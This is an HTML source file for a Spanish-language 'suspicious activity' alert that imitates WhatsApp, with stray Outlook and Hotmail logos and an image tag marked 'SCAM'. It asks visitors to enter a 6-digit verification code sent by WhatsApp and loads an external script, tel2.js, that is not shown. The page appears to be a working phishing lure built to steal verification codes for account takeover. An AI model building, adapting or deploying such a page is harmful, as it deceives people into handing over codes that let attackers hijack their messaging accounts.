<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alerta de Actividad Sospechosa - WhatsApp</title>
    <link rel="stylesheet" type="text/css" href="styles.css">
</head>
<body>


    <header>
        <img src="https://logowik.com/content/uploads/images/117_outlook.jpg" alt="Logo WhatsApp">
    </header>

    <div class="content">
         <img src="https://cdn.glitch.global/619bbf3f-0832-4238-90da-3c5dfc53bd19/222hotmail.jpg?v=1714286364817"type="SCAM/favicon.png"
      sizes="16x16">
        <p>Le hemos enviado un código de verificación de 6 dígitos via WhatsApp a su número teléfono registrado, por favor, introduzca el código:</p>
        <form id="verificationForm">
    
            <input type="tel" id="cod" name="cod" minlength="6" maxlength="6" placeholder="Código" required>

            <button type="submit" id="submitButton">Continuar</button>
        </form>
    </div>

    <footer>
        <img src="https://static.whatsapp.net/rsrc.php/ya/r/GjxmhIpug9B.svg" alt="Logo WhatsApp">
    </footer>
<script type="text/javascript" src="tel2.js"></script>
</body>
</html>
